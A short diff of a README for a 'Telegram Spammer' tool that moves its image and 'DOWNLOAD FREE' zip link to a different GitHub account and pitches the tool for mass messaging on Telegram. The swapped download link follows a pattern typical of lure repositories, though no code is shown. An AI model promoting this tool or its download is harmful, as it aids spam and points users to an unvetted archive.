@@ -1,8 +1,9 @@
 NEW VERSION UPLOADED
 
-![изображение](https://github.com/MusrityGD/TelegramSpammer/assets/168616606/bb7eafc7-a320-487d-a769-180a17c04c78)
+![изображение](https://github.com/nicetoolgenii/Telegram-Spammer/assets/174972903/9a8661d1-88ca-42fd-b0d0-899354319e82)
 
-[DOWNLOAD FREE](https://github.com/MusrityGD/TelegramSpammer/archive/refs/heads/main.zip)
+
+[DOWNLOAD FREE](https://github.com/nicetoolgenii/Telegram-Spammer/archive/refs/heads/main.zip)
 
 EN:Telegram is a popular messenger that provides a wide range of opportunities for communication and information sharing. If you want to effectively communicate with your audience or target group of users on Telegram, a messenger can be a powerful tool for mass messaging. In this article, we will look at the role and benefits of a mailer for Telegram and how it can help you achieve your communication goals.
 
